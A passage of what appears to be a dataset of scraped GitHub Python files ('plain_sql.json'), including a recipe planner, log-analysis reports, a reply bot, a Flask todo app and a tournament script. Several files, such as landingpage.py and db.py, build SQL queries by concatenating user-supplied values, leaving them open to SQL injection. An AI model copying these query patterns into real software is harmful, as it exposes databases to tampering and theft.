articles.slug\r\n                    GROUP BY articles.title, articles.author)\r\n                    AS article_result\r\n                    GROUP BY article_result.author) as author_result\r\n                    ON authors.id = author_result.author\r\n                    ORDER BY num DESC LIMIT {}\"\"\".format(top_num)\r\n    return execute_query(cmd)\r\n\r\n\r\ndef get_show_stoper_days():\r\n    \"\"\" query the accident(errors happened more than 1%) days\r\n        => list of [date, error rate]\r\n    \"\"\"\r\n    cmd = \"\"\"SELECT to_char(date, 'FMMonth DD, YYYY') as date,\r\n             ROUND(error_percent, 2) as error_rate\r\n             FROM(\r\n             SELECT time::date AS date,\r\n             100 * (COUNT(*) FILTER (WHERE status = '404 NOT FOUND') /\r\n             COUNT(*)::numeric) AS error_percent\r\n             FROM log GROUP BY time::date) a\r\n             WHERE error_percent > 1\"\"\"\r\n    return execute_query(cmd)\r\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/trishamoyer/RecipePlanner-Python/blob/11a926de743d3ed1fc73d678e31f5e3408b00958",
        "file_path": "/landingpage.py",
        "source": "from tkinter import *\nfrom addRecipe import AddARecipe\nfrom tkinter import messagebox\nimport datetime\nfrom mealPlan import MakeMealPlan\nfrom PIL import Image, ImageTk\nimport sqlite3\n\nLARGE_FONT=(\"Trebuchet MS\", 24)\nMEDIUM_FONT=(\"Trebuchet MS\", 12)\n\nrecipeNames = []\n\nclass LandingPage(Frame):\n    def __init__(self, parent, controller):\n        Frame.__init__(self, parent)\n\n        viewRecipeFrame = Frame(self, bg=\"#f8f8f8\")\n        menuFrame = Frame(self, bg=\"#e7e7e7\")\n\n        frame = Frame(self, bg=\"#f8f8f8\")\n        frame.pack(expand=True, fill='both')\n\n        Label(frame, text=\"Trisha's Meal Planner\", font=LARGE_FONT, bg=\"#f8f8f8\", fg=\"#000000\").pack(fill='both', pady=20)\n\n        load = Image.open(\"recipe_card.jpg\")\n        render = ImageTk.PhotoImage(load)\n        img = Label(frame, image = render, bg=\"#f8f8f8\")\n        img.image = render\n        img.pack(fill='both', pady=40)\n\n        Button(frame, text=\"Add A Recipe\", highlightbackground=\"#f8f8f8\", command=lambda: controller.show_frame(AddARecipe)).pack(fill=Y)\n        Button(frame, text=\"Make a Meal Plan\", highlightbackground=\"#f8f8f8\", command=lambda: controller.show_frame(MakeMealPlan)).pack(fill=Y)\n        Button(frame, text=\"View Recipes\", highlightbackground=\"#f8f8f8\", command=lambda: view_recipes()).pack(fill=Y)\n\n        def view_recipes():\n            frame.pack_forget()\n            viewRecipeFrame.pack(expand=True, fill='both')\n\n            database_file = \"meal_planner.db\"\n            with sqlite3.connect(database_file) as conn:\n                cursor = conn.cursor()\n                selection = cursor.execute(\"\"\"SELECT * FROM recipe\"\"\")\n                for result in [selection]:\n                    for row in result.fetchall():\n                        name = row[0]\n                        recipeNames.append(name)\n            conn.close()\n            for i in range(len(recipeNames)):\n                label = Label(viewRecipeFrame, font=MEDIUM_FONT, bg=\"#f8f8f8\", fg=\"#000000\", text=recipeNames[i])\n                label.pack()\n                label.bind(\"<Button-1>\", lambda  event, x=recipeNames[i]: [callback(x), viewRecipeFrame.pack_forget()])\n\n\n        def callback(recipeName):\n                viewRecipeFrame.pack_forget()\n                database_file = \"meal_planner.db\"\n\n                menuFrame.pack(fill='both')\n                load = Image.open(\"home.jpg\")\n                render = ImageTk.PhotoImage(load)\n                img = Button(menuFrame, image=render, borderwidth=0, highlightthickness=0,\n                             highlightbackground=\"#e7e7e7\",\n                             command=lambda: [frame.pack(expand=True, fill='both'), menuFrame.pack_forget(), viewDetailsFrame.pack_forget()])\n                img.image = render\n                img.pack(side=LEFT)\n                label = Label(menuFrame, text=\"View Recipe\", font=LARGE_FONT, bg=\"#e7e7e7\", fg=\"#272822\")\n                label.pack(side=LEFT, padx=300)\n\n                viewDetailsFrame = Frame(self, bg=\"#f8f8f8\")\n                viewDetailsFrame.pack(expand=True, fill='both')\n                with sqlite3.connect(database_file) as conn:\n                    cursor = conn.cursor()\n                    selection = cursor.execute(\"\"\"SELECT * FROM recipe WHERE name = \"\"\" + \"\\\"\" + recipeName + \"\\\"\" )\n                    for result in [selection]:\n                        for row in result.fetchall():\n                            name = row[0]\n                            time = row[1]\n                            servings = row[2]\n                            favorite = row[3]\n                            ingredients = row[4]\n                            directions = row[5]\n                    string = (\"Name: {} \\n Cook time: {} \\n Number of Servings: {} \\n Ingredients: {} \\n Directions: {}\".format(name, time, servings, ingredients, directions))\n                    Label(viewDetailsFrame, text=string, font=MEDIUM_FONT, bg=\"#f8f8f8\", fg=\"#000000\").pack(side=LEFT)\n                conn.close()\n\n                Button(menuFrame, text=\"Delete\", highlightbackground=\"#e7e7e7\",\n                       command=lambda: delete_recipe(name)).pack(side=RIGHT)\n\n        def delete_recipe(recipeName):\n            database_file = \"meal_planner.db\"\n\n            now = datetime.datetime.now()\n            dt = datetime.date(now.year, now.month, now.day)\n            weekNumber = dt.isocalendar()[1]\n\n            tableName = \"recipes_\" + str(weekNumber)\n            with sqlite3.connect(database_file) as conn:\n                cursor = conn.cursor()\n                cursor.execute(\"\"\"SELECT recipe FROM \"\"\" + tableName + \"\"\" WHERE recipe = \"\"\" + \"\\\"\" + recipeName + \"\\\"\")\n                returnObject = cursor.fetchone()\n                if returnObject:\n                    print(returnObject[0])\n                    messagebox.showerror(\"Cannot Delete\",\n                                         \"Cannot delete recipe when it's used in the current week's menu.\")\n                    # conn.close()\n                else:\n                    # conn.close()\n                    actually_delete(recipeName)\n\n        def actually_delete(recipeName):\n            queryString = \"\\\"\" + recipeName + \"\\\"\"\n            with sqlite3.connect(\"meal_planner.db\") as conn:\n                cursor = conn.cursor()\n                cursor.execute(\"\"\"DELETE FROM recipe WHERE name = \"\"\" + \"\\\"\" + recipeName + \"\\\"\")\n                print(cursor.rowcount)\n                if cursor.rowcount == 1:\n                    messagebox.showinfo(\"Success\", \"Recipe Deleted.\")\n                    menuFrame.pack_forget()\n                    viewRecipeFrame.pack(expand=True, fill='both')\n                elif cursor.rowcount == 0:\n                    messagebox.showerror(\"Cannot Delete\",\n                                         \"Cannot delete recipe, please try again.\")\n            conn.close()\n\n\n\n\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/trishamoyer/RecipePlanner-Python/blob/11a926de743d3ed1fc73d678e31f5e3408b00958",
        "file_path": "/mealPlan.py",
        "source": "from tkinter import *\nimport datetime\nfrom isoweek import Week\nfrom tkinter import ttk\nimport sqlite3\nfrom PIL import Image, ImageTk\n\nLARGE_FONT=(\"Trebuchet MS\", 24)\nMEDIUM_FONT=(\"Trebuchet MS\", 14)\n\n\nclass MakeMealPlan(Frame):\n    def __init__(self, parent, controller):\n        Frame.__init__(self, parent, bg=\"#f8f8f8\")\n        menuFrame = Frame(self, bg=\"#e7e7e7\")\n        menuFrame.pack(fill='both')\n        load = Image.open(\"home.jpg\")\n        render = ImageTk.PhotoImage(load)\n        from landingpage import LandingPage\n        img = Button(menuFrame, image=render, borderwidth=0, highlightthickness=0, highlightbackground=\"#e7e7e7\",\n                     command=lambda: controller.show_frame(LandingPage))\n        img.image = render\n        img.pack(side=LEFT)\n\n        label = Label(menuFrame, text=\"Meal Planner\", font=LARGE_FONT, bg=\"#e7e7e7\", fg=\"#272822\")\n        label.pack(side=LEFT, padx=289)\n\n        groceryButton = Button(menuFrame, text=\"Grocery List\", highlightbackground=\"#e7e7e7\", command=lambda: view_grocery_list())\n        groceryButton.pack(side=LEFT)\n\n        viewRecipeFrame = Frame(self, bg=\"#f8f8f8\")\n\n        now = datetime.datetime.now()\n        dt = datetime.date(now.year, now.month, now.day)\n        weekNumber = dt.isocalendar()[1]\n        w = Week(now.year, weekNumber)\n\n        menu = Frame(self, bg=\"#f8f8f8\")\n        menu.rowconfigure(0, weight=1)\n        menu.columnconfigure(0, weight=1)\n        menu.rowconfigure(1, weight=3)\n        menu.columnconfigure(1, weight=3)\n        menu.pack()\n\n        columnLabels = [\"Breakfast\", \"Lunch\", \"Dinner\"]\n        for i in range(len(columnLabels)):\n            Label(menu, text=columnLabels[i], font=(\"Trebuchet MS\", 16), bg=\"#f8f8f8\").grid(row=0, column=i+2, pady= 10,\n                                                                                        padx=85, sticky=\"nsew\")\n        mondayText = \"Monday \" + str(w.monday())\n        tuesdayText = \"Tuesday \" + str(w.tuesday())\n        wednesdayText = \"Wednesday \" + str(w.wednesday())\n        thursdayText = \"Thursday \" + str(w.thursday())\n        fridayText = \"Friday \" + str(w.friday())\n        saturdayText = \"Saturday \" + str(w.saturday())\n        sundayText = \"Sunday \" + str(w.sunday())\n\n        labels = [mondayText, tuesdayText, wednesdayText, thursdayText, fridayText, saturdayText, sundayText]\n        for i in range(len(labels)):\n            Label(menu, font=(\"Trebuchet MS\", 12), bg=\"#f8f8f8\", text=labels[i]).grid(row=i+1, column=0, padx = 5, pady=15, sticky=\"w\")\n            sep = ttk.Separator(menu, orient=\"vertical\")\n            sep.grid(row=i+1, column=1, padx=5, sticky=\"nsew\")\n\n        buttonDict = {}\n        listOfButtons = []\n        for rows in range(len(labels)):\n            for columns in range(len(columnLabels)):\n                buttons = Button(menu, text=\"Add meal to day\", highlightbackground=\"#f8f8f8\", command=lambda x=rows + 1, y=columns + 2: add_meal(x, y))\n                buttons.grid(row=rows+1, column=columns+2)\n                buttons.position = (rows+1, columns+2)\n                buttonDict[buttons] = buttons.position\n                listOfButtons.append(buttons)\n\n        def add_meal(rowLocation, columnLocation):\n            menu.pack_forget()\n            viewRecipeFrame.forget()\n            add_meal_frame = Frame(self, bg=\"#f8f8f8\")\n            add_meal_frame.rowconfigure(0, weight=1)\n            add_meal_frame.columnconfigure(0, weight=1)\n            add_meal_frame.rowconfigure(1, weight=3)\n            add_meal_frame.columnconfigure(1, weight=3)\n            add_meal_frame.pack()\n\n            recipeNames = []\n            ingredientList = []\n            database_file = \"meal_planner.db\"\n            with sqlite3.connect(database_file) as conn:\n                cursor = conn.cursor()\n                selection = cursor.execute(\"\"\"SELECT * FROM recipe\"\"\")\n                for result in [selection]:\n                    for row in result.fetchall():\n                        name = row[0]\n                        ingredients = row[4]\n                        recipeNames.append(name)\n                        ingredientList.append(ingredients)\n            for i in range(len(recipeNames)):\n                Button(add_meal_frame, text=recipeNames[i], highlightbackground=\"#f8f8f8\", command=lambda x=recipeNames[i], y=ingredientList[i]:add_recipe(x, y, add_meal_frame,\n                                                                                     rowLocation, columnLocation)).grid(row=i, column=0)\n\n        def add_recipe(recipe, ingredients, view, row, column):\n            view.pack_forget()\n            viewRecipeFrame.forget()\n            searchIndex = (row, column)\n            for key, value in buttonDict.items():\n                if value == searchIndex:\n                    key.destroy()\n            save_weeks_recipes(recipe, row, column)\n            save_ingredients(ingredients)\n            recipeLabel = Label(menu, text=recipe, bg=\"#f8f8f8\")\n            recipeLabel.grid(row = row, column = column)\n            recipeLabel.bind(\"<Button-1>\", lambda event: callback(recipe))\n            menu.pack()\n\n        def callback(recipeName):\n            menu.pack_forget()\n            viewRecipeFrame.pack(expand=True, fill='both')\n            groceryButton.pack_forget()\n            database_file = \"meal_planner.db\"\n            print(recipeName)\n            with sqlite3.connect(database_file) as conn:\n                cursor = conn.cursor()\n                selection = cursor.execute(\"\"\"SELECT * FROM recipe WHERE name = \"\"\" + \"\\\"\" + recipeName + \"\\\"\")\n                for result in [selection]:\n                    for row in result.fetchall():\n                        name = row[0]\n                        time = row[1]\n                        servings = row[2]\n                        ingredients = row[4]\n                        directions = row[5]\n\n                        string = (\"Name: {} \\n Cook time: {} \\n Number of Servings: {} \\n \".format(name, time, servings))\n                        secondString = (\"Ingredients: {}\".format(ingredients))\n                        thirdString = (\"Directions: {}\".format(directions))\n            Label(viewRecipeFrame, text=string, font=MEDIUM_FONT, bg=\"#f8f8f8\", fg=\"#000000\").pack(side=TOP)\n            Label(viewRecipeFrame, text=secondString, font=MEDIUM_FONT, bg=\"#f8f8f8\", fg=\"#000000\").pack(side=TOP)\n            Label(viewRecipeFrame, text=thirdString, font=MEDIUM_FONT, bg=\"#f8f8f8\", fg=\"#000000\").pack(side=TOP)\n            returnButton = Button(menuFrame, text = \"Return to Menu\", highlightbackground=\"#e7e7e7\", command=lambda: [viewRecipeFrame.pack_forget(),\n                                                                                     menu.pack(), returnButton.pack_forget(), label.configure(text=\"Meal Planer\"),\n                                                                                    groceryButton.pack(side=RIGHT)])\n            returnButton.pack(side=RIGHT)\n\n\n        def view_grocery_list():\n            print(\"grocery== list\")\n            groceryListFrame = Frame(self)\n            groceryListFrame.rowconfigure(0, weight=1)\n            groceryListFrame.columnconfigure(0, weight=1)\n            groceryListFrame.rowconfigure(1, weight=3)\n            groceryListFrame.columnconfigure(1, weight=3)\n            groceryListFrame.pack()\n\n            menu.pack_forget()\n            groceryButton.pack_forget()\n            label.configure(text=\"Grocery List\")\n\n            i = 0\n            database_file = \"meal_planner.db\"\n            item_array = []\n            with sqlite3.connect(database_file) as conn:\n                cursor = conn.cursor()\n                tableName = \"ingredients_\" + str(weekNumber)\n                selection = cursor.execute(\"\"\"SELECT * FROM \"\"\" + tableName)\n                for result in [selection]:\n                    for row in result.fetchall():\n                        print(row)\n                        for ingredient in row:\n                            print(ingredient)\n                            item_array.append(str(ingredient).split())\n                        i = i +1\n                        Label(groceryListFrame, text=ingredient, font=MEDIUM_FONT, justify=LEFT).grid(row=i, column=0, sticky=\"w\")\n            \n\n            j = 0\n            for item in item_array:\n                print(item)\n\n\n            returnButton = Button(menuFrame, text = \"Return to Menu\", highlightbackground=\"#e7e7e7\", command=lambda: [groceryListFrame.pack_forget(),\n                                                                                     menu.pack(), returnButton.pack_forget(), label.configure(text=\"Meal Planer\"),\n                                                                                    groceryButton.pack(side=RIGHT)])\n            returnButton.pack(side=RIGHT)\n\n\n        def save_ingredients(ingredients):\n            database_file = \"meal_planner.db\"\n            with sqlite3.connect(database_file) as conn:\n                # create the table if it hasn't been created yet\n                tableName = \"ingredients_\" + str(weekNumber)\n                conn.execute('''CREATE TABLE IF NOT EXISTS ''' + tableName + ''' (ingredients text)''')\n                conn.execute(\"\"\"INSERT INTO \"\"\" + tableName + \"\"\" VALUES (?);\"\"\", (ingredients,))\n            \n        def save_weeks_recipes(recipeName, row, column):\n            print(\"save weeks\")\n            database_file = \"meal_planner.db\"\n            with sqlite3.connect(database_file) as conn:\n                # create the table if it hasn't been created yet\n                tableName = \"recipes_\" + str(weekNumber)\n                conn.execute('''CREATE TABLE IF NOT EXISTS ''' + tableName + ''' (recipe text, row int, column int)''')\n                conn.execute(\"\"\"INSERT INTO \"\"\" + tableName + \"\"\" VALUES (?, ?, ?);\"\"\", (recipeName, row, column))\n            ",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/evelozud2017/log-analysis/blob/c6d74bf6de2307e1ecd140dc2c47e19ba7cb3303",
        "file_path": "/report.py",
        "source": "#!/usr/bin/env python3\nimport psycopg2\n\nDBNAME = \"news\"\n\n\ndef get_top_articles(list_count):\n    \"\"\"Return article and number of times viewed with most viewed first.\"\"\"\n    query = (\n        'select a.title, count(alv.article) as views from articles a, '\n        ' article_log_view alv where a.slug = alv.article '\n        ' group by a.title '\n        ' order by count(alv.article) desc limit %d;' % list_count)\n    db = psycopg2.connect(database=DBNAME)\n    c = db.cursor()\n    c.execute(query)\n    rows = c.fetchall()\n    db.close()\n    return rows\n\n\ndef get_top_authors():\n    \"\"\"Return author and number of views with most viewed first.\"\"\"\n    query = (\n        'select au.name, count(alv.article) as views '\n        ' from articles a inner join article_log_view alv '\n        ' on a.slug = alv.article '\n        ' inner join authors au '\n        ' on a.author = au.id '\n        ' group by au.name '\n        ' order by count(alv.article) desc;')\n    db = psycopg2.connect(database=DBNAME)\n    c = db.cursor()\n    c.execute(query)\n    rows = c.fetchall()\n    db.close()\n    return rows\n\n\ndef get_most_error_day():\n    \"\"\"Return day with errors > 1%.\"\"\"\n    query = (\n        'select tot.logdate, '\n        ' round(((err.errors_count::decimal/tot.requests_count)*100),2) '\n        ' as err_pct '\n        ' from '\n        ' ( select to_char(time, \\'FMMonth DD, YYYY\\') as logdate, '\n        ' count(*) as requests_count '\n        ' from log '\n        ' group by to_char(time, \\'FMMonth DD, YYYY\\') ) tot, '\n        '( select to_char(time, \\'FMMonth DD, YYYY\\') as logdate,  '\n        ' count(*) as errors_count '\n        ' from log '\n        ' where status <> \\'200 OK\\' '\n        ' group by to_char(time, \\'FMMonth DD, YYYY\\') ) err '\n        ' where '\n        ' tot.logdate = err.logdate '\n        ' and (err.errors_count::decimal/tot.requests_count) > .01; ')\n    db = psycopg2.connect(database=DBNAME)\n    c = db.cursor()\n    c.execute(query)\n    rows = c.fetchall()\n    db.close()\n    return rows\n\n\ndef print_top_articles(list_count):\n    \"\"\"Prints the articles and number of times viewed.\"\"\"\n    print(\"What are the most popular %d articles of all time?\\n\" % list_count)\n    top_articles = \"\\\"%s\\\" - %d views\\n\"\n    results = \"\".join(\n        top_articles % (title, views) for title, views in get_top_articles(\n            list_count))\n    print(results)\n\n\ndef print_top_authors():\n    \"\"\"Prints the author and total times their article were viewed.\"\"\"\n    print(\"What are the most popular article authors of all time?\\n\")\n    top_authors = \"%s - %d views\\n\"\n    results = \"\".join(\n        top_authors % (name, views) for name, views in get_top_authors())\n    print(results)\n\n\ndef print_top_errors():\n    \"\"\"Prints day(s) where requests had more than 1 percent error.\"\"\"\n    print(\"On which days did more than 1% of requests lead to errors?\\n\")\n    top_authors = \"%s - % 6.2f%% errors\\n\"\n    results = \"\".join(\n        top_authors % (\n            logdate, err_pct) for logdate, err_pct in get_most_error_day())\n    print(results)\n\n\nprint_top_articles(3)\nprint_top_authors()\nprint_top_errors()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/tadaren/reply_bot/blob/37bc8921e15c1daae988c127137700f084926db0",
        "file_path": "/db.py",
        "source": "import psycopg2\n\nconfig = {}\n\ndef get_all():\n    connection = psycopg2.connect(host=config['HOST'], port=config['PORT'], database=config['NAME'], user=config['USER'], password=config['PASSWORD'])\n    cur = connection.cursor()\n    cur.execute(\"select * from reply_map\")\n    out = {}\n    for row in cur:\n        out[row[0]] = row[1]\n    connection.commit()\n    return out\n\ndef insert(key, value):\n    connection = psycopg2.connect(host=config['HOST'], port=config['PORT'], database=config['NAME'], user=config['USER'], password=config['PASSWORD'])\n    cur = connection.cursor()\n    try:\n        cur.execute(\"insert into reply_map values('{}', '{}')\".format(key, value))\n        connection.commit()\n    except:\n        pass\n\nif __name__ == '__main__':\n    connection = psycopg2.connect(host=config['HOST'], port=config['PORT'], database=config['NAME'], user=config['USER'], password=config['PASSWORD'])\n    cur = connection.cursor()\n    cur.execute(\"create table reply_map(key text not null unique, value text not null)\")\n    connection.commit()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/mamilkew/aitsltkms/blob/b1cb7dc8ce6ee5de8041cde730f62db6b84c2213",
        "file_path": "/pages/context_processors.py",
        "source": "from django.utils import timezone\nfrom django.db.models import Avg, Count, Min, Max, Sum\n\n\ndef navbarmain(request):\n    from pages.models import Post\n    navbarMain = Post.objects.filter(published_date__lte=timezone.now())\n    # print(Post.objects.values('subject').annotate(newest_published_date=Max('published_date')))\n    pb = Post.objects.values('subject').annotate(newest_published_date=Max('published_date'))\n    pb_list = Post.objects.filter(subject__in=[b.get('subject') for b in pb], published_date__in=[b.get('newest_published_date') for b in pb])\n    # print(pb_list)\n    return {'navbarMain': pb_list}\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/johncoleman83/todo-list/blob/44b26a4d6d5e09e712378325e8e076dc948acd2a",
        "file_path": "/models/engine/db_storage.py",
        "source": "#!/usr/bin/python3\n\"\"\"\nDatabase storage engine\n\"\"\"\nfrom sqlalchemy import create_engine, MetaData\nfrom sqlalchemy.orm import sessionmaker, scoped_session\nfrom models.base_model import Base\nfrom models import base_model, task, user\nfrom models.secrets import USER, PW, HOST, DB\n\nclass DBStorage:\n    \"\"\"\n    handles long term storage of all class instances\n    \"\"\"\n    CNC = {\n        'Task': task.Task,\n        'User': user.User,\n    }\n    __engine = None\n    __session = None\n\n    def __init__(self):\n        \"\"\"\n        creates the engine self.__engine\n        \"\"\"\n        self.__engine = create_engine(\n            'mysql+mysqldb://{}:{}@{}:3306/{}'\n            .format(USER, PW, HOST, DB)\n        )\n\n    def all(self, cls=None):\n        \"\"\"\n        returns a dictionary of all objects\n        \"\"\"\n        obj_dict = {}\n        if cls is not None:\n            a_query = self.__session.query(DBStorage.CNC[cls])\n            for obj in a_query:\n                obj_ref = \"{}.{}\".format(type(obj).__name__, obj.id)\n                if cls == 'User' and obj.tasks:\n                    pass\n                obj_dict[obj_ref] = obj\n            return obj_dict\n\n        for c in DBStorage.CNC.values():\n            a_query = self.__session.query(c)\n            for obj in a_query:\n                obj_ref = \"{}.{}\".format(type(obj).__name__, obj.id)\n                if type(c).__name__ == 'User' and obj.tasks:\n                    pass\n                obj_dict[obj_ref] = obj\n        return obj_dict\n\n    def new(self, obj):\n        \"\"\"\n            adds objects to current database session\n        \"\"\"\n        self.__session.add(obj)\n\n    def save(self):\n        \"\"\"\n            commits all changes of current database session\n        \"\"\"\n        self.__session.commit()\n\n    def rollback_session(self):\n        \"\"\"\n            rollsback a session in the event of an exception\n        \"\"\"\n        self.__session.rollback()\n\n    def delete(self, obj=None):\n        \"\"\"\n            deletes obj from current database session if not None\n        \"\"\"\n        if obj:\n            self.__session.delete(obj)\n            self.save()\n\n    def delete_all(self):\n        \"\"\"\n           deletes all stored objects, for testing purposes\n        \"\"\"\n        for c in DBStorage.CNC.values():\n            a_query = self.__session.query(c)\n            all_objs = [obj for obj in a_query]\n            for obj in range(len(all_objs)):\n                to_delete = all_objs.pop(0)\n                to_delete.delete()\n        self.save()\n\n    def reload(self):\n        \"\"\"\n           creates all tables in database & session from engine\n        \"\"\"\n        Base.metadata.create_all(self.__engine)\n        self.__session = scoped_session(\n            sessionmaker(\n                bind=self.__engine,\n                expire_on_commit=False))\n\n    def close(self):\n        \"\"\"\n            calls remove() on private session attribute (self.session)\n        \"\"\"\n        self.__session.remove()\n\n    def get(self, cls, id):\n        \"\"\"\n        retrieves one object based on class name and id\n        \"\"\"\n        if cls and id:\n            fetch = \"{}.{}\".format(cls, id)\n            all_obj = self.all(cls)\n            return all_obj.get(fetch)\n        return None\n\n    def count(self, cls=None):\n        \"\"\"\n            returns the count of all objects in storage\n        \"\"\"\n        return (len(self.all(cls)))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/johncoleman83/todo-list/blob/44b26a4d6d5e09e712378325e8e076dc948acd2a",
        "file_path": "/web_app/app.py",
        "source": "#!/usr/bin/env python3\n\"\"\"\nFlask App for Todo List MVP\n\"\"\"\nfrom flask import abort, Flask, jsonify\nfrom flask import render_template, request, url_for\nimport json\nfrom models import storage, Task, User, REQUIRED, PORT, HOST\nimport requests\nfrom uuid import uuid4\n\n\n# flask setup\napp = Flask(__name__)\napp.url_map.strict_slashes = False\nERRORS = [\n    \"Not a JSON\", \"Missing required information\", \"Missing id\",\n    \"Wrong id type\"\n]\n\ndef api_response(state, message, code):\n    \"\"\"\n    Method to handle errors with api\n    \"\"\"\n    response = { state: message, \"status_code\": code }\n    resp_json = jsonify(message)\n    return resp_json\n\n@app.teardown_appcontext\ndef teardown_db(exception):\n    \"\"\"\n    after each request, this method calls .close() (i.e. .remove()) on\n    the current SQLAlchemy Session\n    \"\"\"\n    storage.close()\n\n@app.route('/', methods=['GET'])\ndef main_index():\n    \"\"\"\n    handles request to main index.html\n    \"\"\"\n    if request.method == 'GET':\n        cache_id = uuid4()\n        return render_template('index.html', cache_id=cache_id)\n\ndef make_todo_list(verified_user):\n    \"\"\"\n    makes JSON todo list for client\n    \"\"\"\n    todo_list = {}\n    todo_list['userInfo'] = verified_user.to_json()\n    all_tasks = todo_list['userInfo'].pop('tasks')\n    return all_tasks\n\n\n@app.route('/api/<fbid>', methods=['GET'])\ndef api_get_handler(fbid=None):\n    \"\"\"\n    handles api get requests\n    \"\"\"\n    if fbid is None:\n        return api_response(\"error\", \"Unknown id\", 401)\n    all_users = storage.all('User').values()\n    verified_user = None\n    for user in all_users:\n        this_fbid = User.text_decrypt(user.fbid)\n        if fbid == this_fbid:\n            verified_user = user\n            break\n    if verified_user is None:\n        return api_response(\"error\", \"Unknown id\", 401)\n    all_tasks = make_todo_list(verified_user)\n    return jsonify(all_tasks), 201\n\ndef initialize_new_task_list(user_info, all_tasks):\n    \"\"\"\n    initializes new task and user from POST request\n    \"\"\"\n    new_user = User(**user_info)\n    new_user.save()\n    user_id = new_user.id\n    for task in all_tasks.values():\n        task['user_id'] = user_id\n        new_task = Task(**task)\n        new_task.save()\n    return \"new user and tasks created\"\n\ndef update_user_tasks(verified_user, all_tasks):\n    \"\"\"\n    updates user task information\n    \"\"\"\n    user_id = verified_user.id\n    db_user_tasks = verified_user.tasks\n    db_user_task_ids = set([task.id for task in db_user_tasks])\n    for task_id, task in all_tasks.items():\n        if task_id in db_user_task_ids:\n            print(db_user_task_ids)\n            db_user_task_ids.remove(task_id)\n            verified_user.bm_update(task)\n        else:\n            task['user_id'] = user_id\n            new_task = Task(**task)\n            new_task.save()\n    if len(db_user_task_ids) > 0:\n        for task_id in db_user_task_ids:\n            task_to_delete = storage.get(\"Task\", task_id)\n            task_to_delete.delete()\n            print('deleted task')\n    return \"new tasks updated & created\"\n\ndef verify_proper_post_request(req_data):\n    \"\"\"\n    verifies that proper request has been made\n    \"\"\"\n    if req_data is None:\n        return 0\n    user_info = req_data.get('userInfo', None)\n    if user_info is None:\n        return 1\n    fbid = user_info.get('fbid', None)\n    if fbid is None:\n        return 2\n    if type(fbid) == 'int':\n        return 3\n    return fbid\n\n\n@app.route('/api', methods=['POST'])\ndef api_post_handler():\n    \"\"\"\n    handles api post requests\n    \"\"\"\n    req_data = request.get_json()\n    verification = verify_proper_post_request(req_data)\n    if type(verification).__name__ == \"int\":\n        return api_response(\"error\", ERRORS[verification], 400)\n    user_info = req_data.get('userInfo', None)\n    all_tasks = req_data.get('allTasks', None)\n    if user_info is None or all_tasks is None:\n        return api_response(\"error\", \"Missing required information\", 400)\n    for req in REQUIRED:\n        if req not in user_info:\n            return api_response(\"error\", \"Missing attribute\", 400)\n    all_users = storage.all('User').values()\n    verified_user = None\n    for user in all_users:\n        this_fbid = User.text_decrypt(user.fbid)\n        if verification == this_fbid:\n            verified_user = user\n            break\n    if verified_user is None:\n        message = initialize_new_task_list(user_info, all_tasks)\n        return api_response(\"success\", message, 200)\n    else:\n        message = update_user_tasks(verified_user, all_tasks)\n        return api_response(\"success\", message, 200)\n\n@app.errorhandler(404)\ndef page_not_found(error):\n    cache_id = uuid4()\n    return render_template('404.html', cache_id=cache_id), 404\n\n\nif __name__ == \"__main__\":\n    \"\"\"\n    MAIN Flask App\n    \"\"\"\n    app.run(host=HOST, port=PORT)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/jerry-le/fullstack-web-developer-udacity-notes/blob/96c27adeb3ce6c58be69b2bb726c874e7ea9a462",
        "file_path": "/3-back-end/codes/tournament/tournament.py",
        "source": "#!/usr/bin/env python\n# \n# tournament.py -- implementation of a Swiss-system tournament\n#\n\nimport psycopg2\nimport bleach\n\n\ndef connect():\n    \"\"\"Connect to the PostgreSQL database.  Returns a database connection.\"\"\"\n    return psycopg2.connect(\"dbname=tournament\")\n\n\ndef execute(query, params=None):\n    conn = connect()\n    c = conn.cursor()\n    if not params:\n        c.execute(query)\n    else:\n        c.execute(query, params)\n    conn.commit()\n    conn.close()\n\n\ndef fetchone(query):\n    conn = connect()\n    cur = conn.cursor()\n    cur.execute(query)\n    result = cur.fetchone()[0]\n    conn.close()\n    return result \n\n\ndef fetchall(query):\n    conn = connect()\n    cur = conn.cursor()\n    cur.execute(query)\n    records = cur.fetchall()\n    conn.close()\n    return records\n\n\ndef deleteMatches():\n    \"\"\"Remove all the match records from the database.\"\"\"\n    execute(\"delete from Match\")\n\n\ndef deletePlayers():\n    \"\"\"Remove all the player records from the database.\"\"\"\n    execute(\"delete from Player\")\n\n\ndef countPlayers():\n    \"\"\"Returns the number of players currently registered.\"\"\"\n    return fetchone(\"select count(*) from Player\")\n\n\ndef registerPlayer(name):\n    \"\"\"Adds a player to the tournament database.\n  \n    The database assigns a unique serial id number for the player.  (This\n    should be handled by your SQL database schema, not in your Python code.)\n  \n    Args:\n      name: the player's full name (need not be unique).\n    \"\"\"\n\n    # prevent xss\n    name = bleach.clean(name)\n\n    execute(\"insert into Player(name) values(%s)\", (name,))\n\n\ndef playerStandings():\n    \"\"\"Returns a list of the players and their win records, sorted by wins.\n\n    The first entry in the list should be the player in first place, or a player\n    tied for first place if there is currently a tie.\n\n    Returns:\n      A list of tuples, each of which contains (id, name, wins, matches):\n        id: the player's unique id (assigned by the database)\n        name: the player's full name (as registered)\n        wins: the number of matches the player has won\n        matches: the number of matches the player has played\n    \"\"\"\n    return fetchall(\"select * from player_static_view order by wins\")\n\n\ndef reportMatch(winner, loser):\n    \"\"\"Records the outcome of a single match between two players.\n\n    Args:\n      winner:  the id number of the player who won\n      loser:  the id number of the player who lost\n    \"\"\"\n\n    # prevent xss\n    winner = bleach.clean(str(winner))\n    loser = bleach.clean(str(loser))\n\n    execute(\"insert into Match(winner, loser) values(%s, %s)\", (winner, loser, ))\n \n \ndef swissPairings():\n    \"\"\"Returns a list of pairs of players for the next round of a match.\n  \n    Assuming that there are an even number of players registered, each player\n    appears exactly once in the pairings. Each player is paired with another\n    player with an equal or nearly-equal win record, that is, a player adjacent\n    to him or her in the standings.\n  \n    Returns:\n      A list of tuples, each of which contains (id1, name1, id2, name2)\n        id1: the first player's unique id\n        